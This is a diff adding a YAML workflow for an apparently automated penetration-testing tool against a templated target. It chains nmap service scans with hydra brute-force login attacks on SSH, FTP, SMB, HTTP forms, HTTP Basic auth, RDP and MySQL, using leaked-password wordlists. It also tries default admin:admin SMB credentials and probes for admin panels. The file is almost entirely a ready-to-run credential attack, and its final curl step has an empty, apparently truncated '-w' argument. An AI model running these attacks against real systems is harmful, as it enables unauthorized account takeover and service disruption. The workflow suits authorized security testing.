@@ -1,0 +1,98 @@
+steps:
+  - tool: nmap
+    arguments:
+      target: "{target}"
+      scan_type: "-sV"
+      ports: "21,22,23,25,53,80,110,139,143,389,443,445,636,993,995,1433,1521,3306,3389,5432,5900,8080"
+      additional_args: "-T4"
+    description: "Service discovery focused on authentication-bearing protocols"
+
+  - tool: nmap
+    arguments:
+      target: "{target}"
+      scan_type: "--script ssh-audit"
+      ports: "22"
+      additional_args: "-T4"
+    description: "SSH configuration audit: weak algorithms, key exchange, MACs"
+
+  - tool: hydra
+    arguments:
+      target: "{target}"
+      service: "ssh"
+      port: "22"
+      wordlist_user: "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+      wordlist_pass: "/usr/share/seclists/Passwords/darkweb2017-top100.txt"
+      additional_args: "-t 6 -V"
+    description: "SSH brute force with common credentials and verbose output"
+
+  - tool: hydra
+    arguments:
+      target: "{target}"
+      service: "ftp"
+      port: "21"
+      wordlist_user: "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+      wordlist_pass: "/usr/share/seclists/Passwords/darkweb2017-top100.txt"
+      additional_args: "-t 6 -V"
+    description: "FTP brute force with common credentials"
+
+  - tool: hydra
+    arguments:
+      target: "{target}"
+      service: "smb"
+      port: "445"
+      wordlist_user: "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+      wordlist_pass: "/usr/share/seclists/Passwords/darkweb2017-top100.txt"
+      additional_args: "-t 4 -V"
+    description: "SMB brute force to test Windows/Unix share authentication"
+
+  - tool: hydra
+    arguments:
+      target: "{target}"
+      service: "http-post-form"
+      port: "80"
+      wordlist_user: "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+      wordlist_pass: "/usr/share/seclists/Passwords/darkweb2017-top100.txt"
+      additional_args: '"/login.php:username=^USER^&password=^PASS^:Invalid" -V'
+    description: "HTTP POST form brute force (adjust path and error string as needed)"
+
+  - tool: hydra
+    arguments:
+      target: "{target}"
+      service: "http-get"
+      port: "80"
+      wordlist_user: "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+      wordlist_pass: "/usr/share/seclists/Passwords/darkweb2017-top100.txt"
+      additional_args: "-V"
+    description: "HTTP Basic Authentication brute force"
+
+  - tool: hydra
+    arguments:
+      target: "{target}"
+      service: "rdp"
+      port: "3389"
+      wordlist_user: "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+      wordlist_pass: "/usr/share/seclists/Passwords/darkweb2017-top100.txt"
+      additional_args: "-t 4 -V"
+    description: "RDP brute force for Windows remote desktop authentication"
+
+  - tool: hydra
+    arguments:
+      target: "{target}"
+      service: "mysql"
+      port: "3306"
+      wordlist_user: "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+      wordlist_pass: "/usr/share/seclists/Passwords/darkweb2017-top100.txt"
+      additional_args: "-t 6 -V"
+    description: "MySQL database authentication brute force"
+
+  - tool: enum4linux
+    arguments:
+      target: "{target}"
+      additional_args: "-u admin -p admin -P"
+    description: "Test for weak/default SMB credentials (admin:admin)"
+
+  - tool: curl
+    arguments:
+      url: "http://{target}/admin"
+      additional_args: "-s -o /dev/null -w "
+    description: "Check for exposed administrative login panels"
